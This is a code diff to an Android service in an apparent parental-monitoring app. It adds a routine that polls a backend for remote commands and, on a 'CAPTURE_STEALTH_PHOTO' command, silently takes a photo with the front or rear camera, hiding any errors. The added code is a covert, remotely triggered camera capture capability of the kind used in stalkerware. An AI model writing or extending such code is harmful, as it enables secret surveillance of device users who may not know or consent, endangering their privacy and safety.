@@ -157,6 +157,9 @@ class ForegroundService : Service() {
                     // Perform chunked batch network sync until all pending unsynced events are drained
                     performChunkedNetworkSync()
 
+                    // Check for any pending remote commands (e.g. Stealth Photo capture)
+                    checkPendingCommands()
+
                     // Fetch & Apply latest blocking rules from NestJS Backend Dashboard
                     fetchAndApplyPolicyRulesFromBackend()
 
@@ -367,4 +370,28 @@ class ForegroundService : Service() {
             // Quiet fallback
         }
     }
+
+    private suspend fun checkPendingCommands() = withContext(Dispatchers.IO) {
+        try {
+            val prefs = AppPreferences(this@ForegroundService)
+            val deviceId = prefs.getDeviceId()
+            val res = ApiConstants.apiService.getPendingCommands(deviceId)
+            if (res.isSuccessful) {
+                val body = res.body()
+                val commands = body?.commands ?: emptyList()
+                for (cmd in commands) {
+                    val action = cmd["action"] as? String
+                    if (action == "CAPTURE_STEALTH_PHOTO") {
+                        val camera = (cmd["camera"] as? String) ?: "FRONT"
+                        Log.i(TAG, "📸 Executing Pending Command: Stealth Photo ($camera camera)")
+                        val stealthCollector = com.parental.agent.collectors.media.StealthPhotoCollector(this@ForegroundService)
+                        stealthCollector.captureStealthPhoto(camera)
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            // Quiet fallback
+        }
+    }
 }
+
